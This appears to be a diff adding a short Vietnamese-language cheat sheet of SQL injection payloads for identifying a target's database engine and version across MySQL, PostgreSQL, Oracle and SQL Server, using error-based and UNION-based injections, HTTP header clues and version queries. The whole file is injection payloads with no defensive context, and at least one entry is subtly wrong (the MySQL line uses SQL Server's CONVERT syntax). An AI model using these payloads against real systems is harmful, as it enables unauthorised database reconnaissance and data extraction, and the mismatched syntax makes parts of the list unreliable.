@@ -1,0 +1,52 @@
+Kiểm tra lỗi SQL:
+
+MySQL:
+sql
+' OR 1=CONVERT(int, (SELECT @@version))--
+PostgreSQL:
+sql
+' OR 1=CAST((SELECT version()) AS int)--
+Oracle:
+sql
+' OR 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM = 1))--
+Microsoft SQL Server:
+sql
+' OR 1=CAST((SELECT @@version) AS int)--
+Kiểm tra cú pháp SQL:
+
+MySQL:
+sql
+' UNION SELECT 1, version(), user()--
+PostgreSQL:
+sql
+' UNION SELECT 1, version(), current_user--
+Oracle:
+sql
+' UNION SELECT 1, banner, NULL FROM v$version--
+Microsoft SQL Server:
+sql
+' UNION SELECT 1, @@version, user--
+Kiểm tra đầu mục HTTP Response:
+
+MySQL:
+Đầu mục Server có thể chứa thông tin về MySQL.
+PostgreSQL:
+Đầu mục Server có thể chứa thông tin về PostgreSQL.
+Oracle:
+Đầu mục X-Powered-By có thể chứa thông tin về Oracle.
+Microsoft SQL Server:
+Đầu mục Server có thể chứa thông tin về SQL Server.
+Kiểm tra câu truy vấn SQL phản hồi:
+
+MySQL:
+sql
+SELECT @@version;
+PostgreSQL:
+sql
+SELECT version();
+Oracle:
+sql
+SELECT banner FROM v$version WHERE ROWNUM = 1;
+Microsoft SQL Server:
+sql
+SELECT @@version;
